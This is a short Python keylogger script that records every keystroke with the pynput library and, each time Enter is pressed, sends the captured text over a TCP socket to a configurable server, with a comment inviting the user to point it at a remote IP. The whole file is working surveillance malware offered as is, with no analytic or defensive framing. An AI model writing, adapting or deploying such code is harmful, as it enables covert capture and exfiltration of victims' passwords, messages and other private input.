import socket
from pynput.keyboard import Key, Listener

# ---------- CONFIG ----------
SERVER_IP = '127.0.0.1'  # Change this to the server's IP for remote use
PORT = 12345
BUFFER_SIZE = 1024
# ---------------------------

# Create TCP socket and connect to server
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, PORT))
    print(f"[+] Connected to server at {SERVER_IP}:{PORT}")
except Exception as e:
    print(f"[!] Failed to connect to server: {e}")
    exit()

logstring = "\n"

# Keylogger callback
def on_press(key):
    global logstring
    try:
        if key != Key.enter:
            if isinstance(key, Key):
                if key == Key.space:
                    logstring += " "
                else:
                    logstring += f"[{key.name}]"
            else:
                logstring += str(key).strip("'")
        else:
            s.sendall(logstring.encode('utf-8'))
            logstring = "\n"
    except Exception as e:
        print(f"[!] Error capturing key: {e}")

# Start listener
with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    finally:
        s.close()
        print("[+] Socket closed")
